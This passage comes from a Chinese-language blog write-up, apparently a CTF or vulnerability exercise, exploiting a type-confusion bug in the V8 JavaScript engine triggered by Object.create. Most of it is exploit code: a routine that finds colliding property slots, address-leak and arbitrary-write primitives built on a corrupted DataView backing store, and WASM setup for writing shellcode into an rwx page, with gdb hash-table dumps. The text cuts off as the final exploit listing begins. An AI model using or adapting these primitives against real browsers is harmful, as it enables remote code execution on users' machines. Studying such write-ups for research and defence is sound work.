class="keyword">function</span> <span class="title function_">find</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">40</span>;i++)&#123;</span><br><span class="line">        obj_array[i] = <span class="string">&#x27;b&#x27;</span>+i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        function triggerVul(obj)&#123;</span></span><br><span class="line"><span class="string">            obj.a;</span></span><br><span class="line"><span class="string">            this.Object.create(obj);</span></span><br><span class="line"><span class="string">            <span class="subst">$&#123;obj_array.map(</span></span></span><br><span class="line"><span class="subst"><span class="string">	    (b) =&gt; <span class="string">`let <span class="subst">$&#123;b&#125;</span> = obj.<span class="subst">$&#123;b&#125;</span>;`</span></span></span></span><br><span class="line"><span class="subst"><span class="string">	    ).join(<span class="string">&#x27;\n&#x27;</span>)&#125;</span></span></span><br><span class="line"><span class="string">            return [<span class="subst">$&#123;obj_array.join(<span class="string">&#x27;, &#x27;</span>)&#125;</span>];</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    `</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">let</span> obj = <span class="title function_">create</span>();</span><br><span class="line">        <span class="keyword">let</span> array = <span class="title function_">triggerVul</span>(obj);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> j = <span class="number">0</span>;j&lt;array.<span class="property">length</span>;j++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(array[j]!=<span class="number">456</span>-j&amp;&amp;array[j]&lt;<span class="number">456</span>&amp;&amp;array[j]&gt;(<span class="number">456</span>-<span class="number">39</span>))&#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] find two : \033[0m&quot;</span>+<span class="string">&#x27;b&#x27;</span>+j+<span class="string">&quot; and &quot;</span>+<span class="string">&#x27;b&#x27;</span>+(<span class="number">456</span>-array[j]));</span><br><span class="line">                <span class="keyword">return</span> [<span class="string">&#x27;b&#x27;</span>+j , <span class="string">&#x27;b&#x27;</span> + (<span class="number">456</span>-array[j])];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">find</span>();</span><br></pre></td></tr></table></figure>

<p>这里解释一下这段代码，首先按照规律：456-i的规律为每个属性bi赋值，然后将值存入数组obj_array中，然后开始循环，外层循环是为了触发优化，内层循环则是比较每一次obj.bi的值是否改变，如果改变了，则<code>j</code>以及<code>456-array[j]</code>即是我们需要找到x与y。</p>
<p>当我们找到x与y后，我们可以通过另一个规律：不同对象的相同属性名的属性在hash表中的位置是一致的来解决hash会变化的问题，我们来创建两个具有相同属性名的对象，来观察他们在内存中的结构：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> obj1 = &#123;<span class="attr">a</span>:<span class="number">1</span>,<span class="attr">b</span>:<span class="number">2</span>,<span class="attr">c</span>:<span class="number">3</span>&#125;;</span><br><span class="line">obj1.<span class="property">d</span> = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">var</span> obj2 = &#123;<span class="attr">a</span>:<span class="number">5</span>,<span class="attr">b</span>:<span class="number">6</span>,<span class="attr">c</span>:<span class="number">7</span>&#125;;</span><br><span class="line">obj2.<span class="property">d</span> = <span class="number">8</span>;</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(obj1);</span><br><span class="line"><span class="title class_">Object</span>.<span class="title function_">create</span>(obj2);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj1);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(obj2);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>在gdb中跑起来之后，我们可以用<code>job</code>命令来查看他们的hash表结构：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">obj1</span>:</span><br><span class="line"></span><br><span class="line"><span class="number">0x32d124d8e401</span>: [<span class="title class_">ObjectHashTable</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x236b46483669</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">53</span></span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">4</span></span><br><span class="line"> - <span class="attr">deleted</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">capacity</span>: <span class="number">16</span></span><br><span class="line"> - <span class="attr">elements</span>: &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">5</span> -&gt; <span class="number">0</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x201e9c6a2991</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: a&gt; -&gt; <span class="number">1</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">448</span> -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x0bbcf4f050a1</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: d&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">4</span> -&gt; <span class="number">1216</span></span><br><span class="line">          <span class="number">10</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x0bbcf4f068c9</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: c&gt;</span><br><span class="line">          <span class="number">12</span>: <span class="number">3</span> -&gt; <span class="number">960</span></span><br><span class="line">          <span class="number">13</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">14</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">15</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"><span class="attr">obj2</span>:</span><br><span class="line"></span><br><span class="line"><span class="number">0x32d124d8e5f1</span>: [<span class="title class_">ObjectHashTable</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x236b46483669</span> &lt;<span class="title class_">Map</span>&gt;</span><br><span class="line"> - <span class="attr">length</span>: <span class="number">53</span></span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">4</span></span><br><span class="line"> - <span class="attr">deleted</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">capacity</span>: <span class="number">16</span></span><br><span class="line"> - <span class="attr">elements</span>: &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">5</span> -&gt; <span class="number">0</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">0x201e9c6a2991</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: a&gt; -&gt; <span class="number">5</span></span><br><span class="line">           <span class="number">2</span>: <span class="number">448</span> -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x0bbcf4f050a1</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: d&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">8</span> -&gt; <span class="number">1216</span></span><br><span class="line">          <span class="number">10</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x0bbcf4f068c9</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: c&gt;</span><br><span class="line">          <span class="number">12</span>: <span class="number">7</span> -&gt; <span class="number">960</span></span><br><span class="line">          <span class="number">13</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">14</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line">          <span class="number">15</span>: <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt; -&gt; <span class="number">0x236b464825a1</span> &lt;<span class="literal">undefined</span>&gt;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>我们可以观察到，虽然obj1与obj2是两个不同的对象，但是他们相同名字的属性在hash表中的偏移却是相同的，那么根据我们上面找到的x与y，我们就可以创建另一个对象<code>new_obj</code>，并根据x与y来对<code>new_obj</code>进行类型混淆，达到泄露地址的目的，我们先写出泄露地址的原语：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="variable constant_">C1</span> = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">let</span> <span class="variable constant_">C2</span> = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_obj_create</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C1</span>&amp;&amp;<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = 456;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C1</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C1&#125;</span> = &#123;c10:1.1,c11:2.2&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C2&#125;</span> = &#123;c20:target&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">        function triggerVul(target)</span></span><br><span class="line"><span class="string">        &#123;</span></span><br><span class="line"><span class="string">        target.a;</span></span><br><span class="line"><span class="string">        this.Object.create(target);</span></span><br><span class="line"><span class="string">        return target.<span class="subst">$&#123;C1&#125;</span>.c10;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">                `</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> obj = <span class="title function_">leak_obj_create</span>(target);</span><br><span class="line">                <span class="keyword">var</span> leak_addr = <span class="title function_">triggerVul</span>(obj);</span><br><span class="line">                <span class="keyword">if</span>(leak_addr!=<span class="number">1.1</span>&amp;&amp;leak_addr!=<span class="number">456</span>&amp;&amp;leak_addr!=<span class="literal">undefined</span>)&#123;</span><br><span class="line">                         <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] target addr is leaked: \033[0m 0x&quot;</span> + (<span class="title function_">f_to_i</span>(leak_addr)));</span><br><span class="line">                         <span class="keyword">return</span> <span class="title function_">f_to_i</span>(leak_addr);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">[<span class="variable constant_">C1</span>,<span class="variable constant_">C2</span>] = <span class="title function_">find</span>();</span><br><span class="line"><span class="keyword">var</span> buffer = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="title function_">leak</span>(buffer);</span><br></pre></td></tr></table></figure>

<p>其中C1，C2就是我们找出的x与y，我们先通过与之前一样的方式为一个对象添加大量属性，与之前不同的是，我们在C1加入属性c10，c11，并向C2中的c20存入一个对象，这样在我们返回C1.c10时，就会把C2.c20处存储的对象的地址作为浮点数返回，造成地址泄露。这里说一下为什么要以<code>Obj.c2=&#123;c20:target&#125;</code>这种方式放入，因为如果直接放，我们泄露出来的并不是这个对象的地址，而是他的Map，这里可以自己调试一下看看就能明白。</p>
<p>然后我们需要任意地址写入，方法与leak差不多，只是我们在创建时，不能<code>obj.C1 = &#123;c11:1.1,c12:2.2&#125;</code>这样了，因为我们写是需要些对象的某个元素写入，那么我们可以按照如下方法构造：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">obj.<span class="property">C1</span> = &#123;<span class="attr">c10</span>:&#123;<span class="attr">c11</span>:<span class="number">1.1</span>,<span class="attr">c12</span>:<span class="number">2.2</span>&#125;&#125;;</span><br><span class="line">obj.<span class="property">C2</span> = &#123;<span class="attr">c20</span>:target&#125;;</span><br></pre></td></tr></table></figure>

<p>这样让<code>obj.C1.c10</code>对应<code>obj.C2.c20</code>，那么我们操作c10的元素，就可以实现对target的属性的操作，而我们希望操作的是<code>DataView</code>的<code>backing store</code>，这样就可以利用dataview实现任意地址写，代码如下：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">write_obj_create</span>(<span class="params">target</span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> obj = &#123;<span class="attr">a</span>:<span class="number">123</span>&#125;;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">30</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C1</span>&amp;&amp;<span class="string">&#x27;b&#x27;</span>+i!=<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;<span class="string">&#x27;b&#x27;</span>+i&#125;</span> = &#123;&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C1</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C1&#125;</span> = &#123;c10:&#123;c11:1.1,c12:2.2&#125;&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">else</span> <span class="keyword">if</span>(<span class="string">&#x27;b&#x27;</span>+i==<span class="variable constant_">C2</span>)&#123;</span><br><span class="line">                        <span class="built_in">eval</span>(<span class="string">`obj.<span class="subst">$&#123;C2&#125;</span> = &#123;c20:target&#125;;`</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">write</span>(<span class="params">target,data</span>)&#123;</span><br><span class="line">	<span class="built_in">eval</span>(<span class="string">`</span></span><br><span class="line"><span class="string">	function triggerVul(target,data)&#123;</span></span><br><span class="line"><span class="string">		target.a;</span></span><br><span class="line"><span class="string">		this.Object.create(target);</span></span><br><span class="line"><span class="string">		let sign = target.<span class="subst">$&#123;C1&#125;</span>.c10.c12;</span></span><br><span class="line"><span class="string">		target.<span class="subst">$&#123;C1&#125;</span>.c10.c12 = (data);</span></span><br><span class="line"><span class="string">		return sign;</span></span><br><span class="line"><span class="string">	&#125;	</span></span><br><span class="line"><span class="string">		`</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i&lt;<span class="number">10000</span>; i++)&#123;</span><br><span class="line">                <span class="keyword">var</span> obj = <span class="title function_">write_obj_create</span>(target);</span><br><span class="line">                <span class="keyword">var</span> sign = <span class="title function_">triggerVul</span>(obj,data);</span><br><span class="line">		<span class="keyword">if</span>(sign!=<span class="number">2.2</span>)&#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;32m[*] target addr has been write with data: \033[0m &quot;</span> + <span class="title function_">f_to_i</span>(data));</span><br><span class="line">			<span class="keyword">return</span> ;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\033[1;31m[!]Failed to Write Data! \033[0m &quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>与前面任意地址读是差不多的，这时，我们就可以找到wasm的<code>rwx</code>段，并向其中写入我们的shellcode了，先对wasm初始化：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Module</span>(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> <span class="title class_">WebAssembly</span>.<span class="title class_">Instance</span>(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> wasm = wasmInstance.<span class="property">exports</span>.<span class="property">main</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_">wasm</span>();</span><br></pre></td></tr></table></figure>

<p>wasmCode我是采用在线网站生成的：<a target="_blank" rel="noopener" href="https://wasdk.github.io/WasmFiddle/%EF%BC%8C%E7%9B%B4%E6%8E%A5%E7%94%A8%E5%AE%83%E9%BB%98%E8%AE%A4%E7%9A%84%E9%82%A3%E4%B8%AA%60return">https://wasdk.github.io/WasmFiddle/，直接用它默认的那个`return</a> 42<code>就行，在初始化之后，我们需要找到</code>rwx&#96;段所在的位置，这个调试慢慢找就行了，我这里给出我找到的路线：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">wasmFunctionaddr </span><br><span class="line">	==&gt;</span><br><span class="line">    SharedInfo </span><br><span class="line">    	==&gt;</span><br><span class="line">    	WasmExportedFunctionData </span><br><span class="line">    		==&gt;</span><br><span class="line">    		Instance</span><br><span class="line">    			==&gt;</span><br><span class="line">    			Instance+0xe8+0x8(直接vmmap看就能发现这里是有rwx权限的)</span><br></pre></td></tr></table></figure>

<p>然后利用dataview写入shellcode就可以了。</p>
<p>最终exp如下：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span 